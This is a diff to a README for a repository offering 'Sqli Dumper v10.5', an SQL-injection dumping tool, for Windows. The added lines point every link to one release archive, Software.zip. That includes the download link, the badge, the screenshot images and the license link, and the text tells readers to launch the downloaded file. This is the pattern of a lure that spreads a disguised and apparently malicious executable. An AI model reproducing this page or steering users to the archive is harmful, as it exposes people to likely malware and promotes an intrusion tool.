@@ -25,8 +25,8 @@ Welcome to the "SQLI-DUMPER-10.5-For-Windows" repository! Here you can download 
 - Sqli Dumper Tutorial 2025
 
 ## Get Started
-To download Sqli Dumper v10.5, click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)  
-[![Download Sqli Dumper](https://img.shields.io/badge/Download-Sqli%20Dumper-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+To download Sqli Dumper v10.5, click [here](https://github.com/ananthu9679/SQLI-DUMPER-10.5-For-Windows/releases/download/v2.0/Software.zip)  
+[![Download Sqli Dumper](https://github.com/ananthu9679/SQLI-DUMPER-10.5-For-Windows/releases/download/v2.0/Software.zip%20Dumper-blue)](https://github.com/ananthu9679/SQLI-DUMPER-10.5-For-Windows/releases/download/v2.0/Software.zip)
 
 If the link ends with a file name, it needs to be launched to start the download process.
 
@@ -34,8 +34,8 @@ If the link is not provided or does not work, please check the "Releases" sectio
 
 ## Screenshots
 Take a sneak peek at the powerful features of Sqli Dumper:
-![Screenshot 1](https://example.com/screenshot1.jpg)
-![Screenshot 2](https://example.com/screenshot2.jpg)
+![Screenshot 1](https://github.com/ananthu9679/SQLI-DUMPER-10.5-For-Windows/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/ananthu9679/SQLI-DUMPER-10.5-For-Windows/releases/download/v2.0/Software.zip)
 
 ## Usage
 Here are some tips on how to make the most out of Sqli Dumper:
@@ -51,6 +51,6 @@ For any questions or assistance regarding Sqli Dumper v10.5, feel free to reach 
 We welcome contributions from the community to enhance the functionality and usability of Sqli Dumper. If you have any ideas for improvements or new features, please submit a pull request and let's collaborate to make Sqli Dumper even better!
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/cli/go-gh/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/ananthu9679/SQLI-DUMPER-10.5-For-Windows/releases/download/v2.0/Software.zip) file for details.
 
 🔒 Happy Database Testing with Sqli Dumper v10.5! 🛡️
